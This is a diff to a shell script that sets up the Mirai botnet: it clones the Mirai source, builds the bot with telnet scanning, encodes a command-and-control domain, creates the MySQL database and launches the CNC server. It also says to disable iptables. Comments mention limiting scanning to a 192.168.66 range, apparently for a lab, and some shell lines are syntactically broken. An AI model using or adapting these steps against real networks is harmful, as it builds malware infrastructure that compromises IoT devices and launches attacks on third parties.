@@ -63,8 +63,33 @@ cd ../../
 go get github.com/go-sql-driver/mysql
 go get github.com/mattn/go-shellwords
 
+cd
+git clone https://github.com/jgamblin/Mirai-Source-Code
+cd Mirai-Source-Code/mirai
+
 # mirai/bot/scanner.c contains list of ip’s (ipv4_t get_random_ip(void);. 
 # This was modified to only parse 192.168.66 ips. 
 
 # mirai/bot/resolv.c 
 # addr.sin_addr.s_addr = INET_ADDR(127,0,0,1);
+
+echo -e "Please give the domain name of the CNC"
+read $domainname 
+
+./build.sh debug telnet
+./debug/enc string $domainname
+# add this output to table.c file
+
+# if iptables in place do service iptables stop && /etc/ini.d/iptbales stop
+
+# mysql commands
+create database mirai;
+use mirai;
+# load sqlscript mirai.sql http://pastebin.com/BsSWnK7i
+
+# set the credentials you used in the ./cnc/main.go file. It should look like this - http://prntscr.com/dnskj5
+service mysql restart
+cd release
+echo "Do you want to start running your cnc instance? Yes or No"
+read $answer 
+if $answer=="Yes" then ./cnc
